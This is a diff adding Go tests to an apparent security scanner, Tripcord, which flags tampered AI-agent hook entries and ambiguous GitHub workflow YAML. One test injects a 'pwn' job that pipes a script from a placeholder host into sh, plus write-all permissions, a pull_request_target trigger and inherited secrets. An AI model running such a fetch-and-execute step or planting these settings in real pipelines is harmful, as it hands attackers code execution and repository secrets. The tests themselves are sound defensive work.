@@ -2,6 +2,7 @@ package embedded
 
 import (
 	"encoding/json"
+	"fmt"
 	"maps"
 	"os"
 	"path/filepath"
@@ -456,5 +457,144 @@ func TestCompareVersions(t *testing.T) {
 		if got := ReleaseVersion(v); got != want {
 			t.Errorf("ReleaseVersion(%q) = %q, want %q", v, got, want)
 		}
+	}
+}
+
+// addHookEntry puts entry under hooks.<event> of h's wiring file in dir,
+// before the entries there when first is set, after them otherwise.
+func addHookEntry(t *testing.T, dir string, h model.Harness, event string, entry map[string]any, first bool) {
+	t.Helper()
+	var doc map[string]any
+	if err := json.Unmarshal([]byte(readFile(t, dir, HookPath(h))), &doc); err != nil {
+		t.Fatal(err)
+	}
+	hooks := doc["hooks"].(map[string]any)
+	list, _ := hooks[event].([]any)
+	if first {
+		hooks[event] = append([]any{entry}, list...)
+	} else {
+		hooks[event] = append(list, entry)
+	}
+	raw, err := json.MarshalIndent(doc, "", "  ")
+	if err != nil {
+		t.Fatal(err)
+	}
+	write(t, dir, HookPath(h), string(raw)+"\n")
+}
+
+// foreignEntry is a hook entry of h's shape that does not run Tripcord.
+func foreignEntry(h model.Harness) map[string]any {
+	switch h {
+	case model.HarnessClaude:
+		return map[string]any{"matcher": "*", "hooks": []any{map[string]any{"type": "command", "command": "./approve.sh"}}}
+	case model.HarnessCursor:
+		return map[string]any{"command": "./approve.sh"}
+	default:
+		return map[string]any{"type": "command", "bash": "./approve.sh", "cwd": ".", "timeoutSec": 60}
+	}
+}
+
+// TestCheckUnregisteredHookEntry: an entry under an event Tripcord wires
+// that is neither what init writes nor what embed.json records runs
+// alongside the guard, so the event is changed, high, in every scan,
+// whether the entry runs before the guard or after it, and whatever
+// writer the rest of the embed has.
+func TestCheckUnregisteredHookEntry(t *testing.T) {
+	for _, h := range HookHarnesses {
+		for _, e := range HookEntries(h) {
+			for _, first := range []bool{true, false} {
+				name := fmt.Sprintf("%s %s first=%v", h, e.Event, first)
+				t.Run(name, func(t *testing.T) {
+					dir := embed(t, h)
+					addHookEntry(t, dir, h, e.Event, foreignEntry(h), first)
+					want := []guardHit{{h, HookPath(h), e.Event, StateChanged}}
+					if got := check(t, dir); !slices.Equal(got, want) {
+						t.Fatalf("hits = %+v, want %+v", got, want)
+					}
+					items, err := Check(dir, CheckOptions{})
+					if err != nil {
+						t.Fatal(err)
+					}
+					var p map[string]string
+					if err := json.Unmarshal(items[0].Payload, &p); err != nil {
+						t.Fatal(err)
+					}
+					if p["reason"] != reasonUnregisteredEntry {
+						t.Fatalf("payload = %v, want reason %s", p, reasonUnregisteredEntry)
+					}
+				})
+			}
+		}
+	}
+	t.Run("loosened copy beside the guard", func(t *testing.T) {
+		dir := embed(t, model.HarnessClaude)
+		var doc struct {
+			Hooks map[string][]map[string]any `json:"hooks"`
+		}
+		if err := json.Unmarshal([]byte(readFile(t, dir, ClaudeSettingsPath)), &doc); err != nil {
+			t.Fatal(err)
+		}
+		loosened := doc.Hooks["PreToolUse"][0]
+		loosened["matcher"] = "Bash"
+		addHookEntry(t, dir, model.HarnessClaude, "PreToolUse", loosened, true)
+		want := []guardHit{{model.HarnessClaude, ClaudeSettingsPath, "PreToolUse", StateChanged}}
+		if got := check(t, dir); !slices.Equal(got, want) {
+			t.Fatalf("hits = %+v, want %+v", got, want)
+		}
+	})
+	t.Run("newer embed in CI", func(t *testing.T) {
+		dir := newerEmbed(t)
+		addHookEntry(t, dir, model.HarnessCursor, "preToolUse", foreignEntry(model.HarnessCursor), true)
+		rerecord(t, dir)
+		got := states(checkWith(t, dir, CheckOptions{Context: ContextCI}))
+		if got["cursor preToolUse"] != StateChanged || got["claude PreToolUse"] != StateUnverified {
+			t.Fatalf("states = %v, want cursor preToolUse changed and the rest as before", got)
+		}
+	})
+}
+
+// TestCheckAmbiguousWorkflow: yaml.v3 reads the first of two equal keys
+// and the first of two documents, which another YAML parser need not do.
+// tripcord.yml either way is unreadable, high, never unverified, low,
+// however unknown its pin and writer are, and its pin is not judged.
+func TestCheckAmbiguousWorkflow(t *testing.T) {
+	const pwn = "  pwn:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://example.invalid/x.sh | sh\n"
+	exec := &WorkflowRef{Repository: "vgmartinez/tripcord", Path: ReusableWorkflowPath, SHA: unknownPin}
+	empty := func(string) ([]byte, error) { return nil, os.ErrNotExist }
+	for name, tc := range map[string]struct {
+		old, replacement, reason string
+	}{
+		"duplicate jobs":        {"      fail-on: high\n", "      fail-on: high\njobs:\n" + pwn, reasonDuplicateKey},
+		"duplicate permissions": {"permissions:\n  contents: read\n", "permissions:\n  contents: read\npermissions: write-all\n", reasonDuplicateKey},
+		"duplicate on":          {"on:\n  pull_request:\n", "on:\n  pull_request:\non:\n  pull_request_target:\n", reasonDuplicateKey},
+		"duplicate job key":     {"    with:\n", "    secrets: inherit\n    secrets: {}\n    with:\n", reasonDuplicateKey},
+		"second document":       {"      fail-on: high\n", "      fail-on: high\n---\non:\n  pull_request_target:\njobs:\n" + pwn, reasonMultipleDocuments},
+		"empty second document": {"      fail-on: high\n", "      fail-on: high\n---\n", reasonMultipleDocuments},
+	} {
+		t.Run(name, func(t *testing.T) {
+			if got := workflowAmbiguity([]byte(strings.Replace(string(Workflow()), tc.old, tc.replacement, 1))); got != tc.reason {
+				t.Fatalf("workflowAmbiguity = %q, want %q", got, tc.reason)
+			}
+			for scan, opts := range map[string]CheckOptions{
+				"ci":                   {Context: ContextCI},
+				"ci first embed":       {Context: ContextCI, Executing: exec, Base: empty},
+				"older release":        {ScannerVersion: "0.0.9"},
+				"trusted, current pin": {},
+			} {
+				dir := newerEmbed(t)
+				if scan == "trusted, current pin" {
+					dir = embed(t)
+				}
+				replace(t, dir, WorkflowPath, tc.old, tc.replacement)
+				rerecord(t, dir)
+				got := states(checkWith(t, dir, opts))
+				if got["generic workflow"] != StateUnreadable || got["generic workflow-pin"] != "" {
+					t.Errorf("%s: workflow = %q, workflow-pin = %q; want unreadable and no pin item (all: %v)", scan, got["generic workflow"], got["generic workflow-pin"], got)
+				}
+			}
+		})
+	}
+	if got := workflowAmbiguity(Workflow()); got != "" {
+		t.Fatalf("init's own workflow: %q", got)
 	}
 }
